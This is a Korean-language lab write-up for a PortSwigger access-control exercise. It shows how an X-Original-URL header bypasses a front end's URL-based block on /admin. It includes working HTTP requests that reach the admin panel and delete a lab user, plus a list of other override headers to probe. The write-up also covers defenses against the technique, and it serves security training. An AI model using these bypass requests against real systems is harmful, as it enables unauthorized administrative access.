# Lab: URL-based access control can be circumvented

## 개요

- **난이도**: Practitioner
- **주제**: Access Control — 플랫폼 설정 오류 / URL 기반 접근 제어 / `X-Original-URL` 헤더 우회
- **링크**: https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

## 목표

프론트엔드가 `/admin` 경로를 외부에서 차단하지만, 백엔드 프레임워크가 `X-Original-URL` 헤더를 지원한다. 이 헤더로 경로를 재정의해 관리자 패널에 접근하고 `carlos` 를 삭제한다.

## 취약 지점 — 플랫폼 설정 오류(Platform Misconfiguration)

```
[구성]
  프론트엔드 시스템: URL 경로 기반으로 접근 제어
    DENY: /admin  → 외부 요청 차단

  백엔드 애플리케이션: X-Original-URL 헤더 지원
    → 요청 라인의 경로 대신 헤더의 경로로 라우팅

[불일치]
  프론트엔드는 "요청 라인의 경로" 를 보고 차단 여부 결정
  백엔드는 "헤더의 경로" 를 보고 실제 처리
  → 검사 대상과 처리 대상이 다름
```

즉, 프론트엔드와 백엔드가 서로 **다른 값**을 URL 로 해석할 때 우회가 발생한다.

### URL 재정의 헤더

```
X-Original-URL    원래 요청되었던 URL 을 백엔드에 전달
X-Rewrite-URL     URL 재작성 용도
X-Forwarded-*     경로/호스트 관련 정보 전달 (X-Forwarded-Prefix 등)

일부 프레임워크/프록시는 위 헤더로 요청 경로를 덮어쓸 수 있다.
```

이번 랩은 `X-Original-URL` 을 사용한다. (사용자 조사처럼 `X-Rewrite-URL` 계열도
환경에 따라 동일하게 악용될 수 있다.)

## 공격 단계

### 1단계 — /admin 차단 확인

```
GET /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

매우 단순한 차단 응답이 온다. 이는 애플리케이션이 아니라
프론트엔드 시스템이 생성한 응답임을 시사한다.

### 2단계 — 헤더가 백엔드에서 처리되는지 확인

요청 라인의 경로를 `/` 로 바꾸고 헤더를 추가한다.

```
GET / HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Original-URL: /invalid
```

`/invalid` 에 대한 "not found" 응답이 오면,
백엔드가 `X-Original-URL` 값을 경로로 사용한다는 것을 확인할 수 있다.

### 3단계 — 관리자 패널 접근

```
GET / HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Original-URL: /admin
```

프론트엔드는 경로 `/` 만 보므로 차단하지 않고,
백엔드는 `/admin` 을 처리해 관리자 패널을 반환한다.

### 4단계 — carlos 삭제

삭제 경로와 쿼리스트링을 함께 전달한다.
`X-Original-URL` 에는 경로를, 실제 쿼리스트링에는 파라미터를 넣는다.

```
GET /?username=carlos HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Original-URL: /admin/delete
```

carlos 삭제 완료 → 랩 해결.

```
[정리]
  요청 라인 경로 : /              ← 프론트엔드 검사 (통과)
  쿼리스트링     : ?username=carlos
  헤더           : X-Original-URL: /admin/delete  ← 백엔드 라우팅
```

## 검증 포인트

```
[1] /admin 접근 차단 응답의 특징 확인
    - 지나치게 단순/고정적이면 프론트엔드(프록시/WAF/게이트웨이) 응답일 수 있음

[2] URL 재정의 헤더 테스트
    X-Original-URL: /invalid   → 404 라우팅되면 백엔드가 처리
    X-Rewrite-URL: /invalid
    X-Forwarded-Prefix 등

[3] 차단된 경로를 헤더로 옮겨 접근 시도
    요청 라인은 허용 경로('/'), 실제 대상은 헤더

[4] 경로/메서드/대소문자/슬래시 변형도 함께 확인 (011, URL-matching 랩)
```

## 방어 — 헤더 및 계층 간 불일치 대응

```
[근본 원인]
  프론트엔드의 URL 기반 접근 제어가 백엔드의 실제 라우팅과 불일치
  + 사용자 제공 URL 재정의 헤더를 백엔드가 신뢰

[올바른 방어]
  1. URL 재정의 헤더를 신뢰하지 않음
     - 외부 요청에서 들어오는 X-Original-URL / X-Rewrite-URL /
       X-Forwarded-* 를 프론트엔드에서 제거(strip)
     - 백엔드가 이 헤더로 라우팅하지 않도록 설정 비활성화
  2. 프론트엔드와 백엔드가 동일한 정규화 경로를 사용
     - 동일한 경로 디코딩/정규화 규칙 적용
     - 접근 제어를 한 지점(가능하면 애플리케이션 내부)에서 일관되게 수행
  3. 접근 제어는 URL 기반 차단에만 의존하지 않음
     - 민감 기능은 애플리케이션 레벨 인가(deny by default) 병행
  4. 신뢰 경계 명확화
     - 프론트엔드에서 검증한 값(경로/호스트/메서드)을 백엔드가 재해석할 여지 제거
  5. 모든 계층에서 동일한 요청 표현을 보도록 아키텍처 정리

[실무 점검]
  리버스 프록시 사용 시:
    - hop-by-hop/override 헤더 화이트리스트 관리
    - 백엔드 프레임워크의 URL 재정의 옵션 확인
```

## 핵심 정리

- 프론트엔드의 URL 기반 `/admin` 차단은 `X-Original-URL: /admin` 헤더로 우회됐다.
- 요청 라인 경로는 `/` 로 두어 프론트엔드 검사를 통과하고, 실제 경로는 헤더로 백엔드에 전달했다.
- 검사 대상(프론트엔드 경로)과 처리 대상(백엔드 헤더 경로)이 달라 접근 제어가 무력화됐다.
- 방어는 URL 재정의 헤더를 제거·무시하고, 계층 간 경로 해석을 일치시키며, 애플리케이션 레벨 인가를 병행하는 것이다.

## 배운 점

- 접근 제어는 "어디서 검사하는가" 와 "어디서 처리하는가" 가 일치해야 유효하다.
- `X-Original-URL` / `X-Rewrite-URL` 같은 재정의 헤더는 환경에 따라 강력한 우회 수단이 된다.
- 사용자 조사처럼, 이런 헤더들을 전면 차단/무시하는 방어 전략을 아키텍처 수준에서 검토해야 한다.
- 다음 랩(011)에서는 HTTP 메서드 차이를 이용한 유사한 플랫폼 설정 오류를 다룬다.
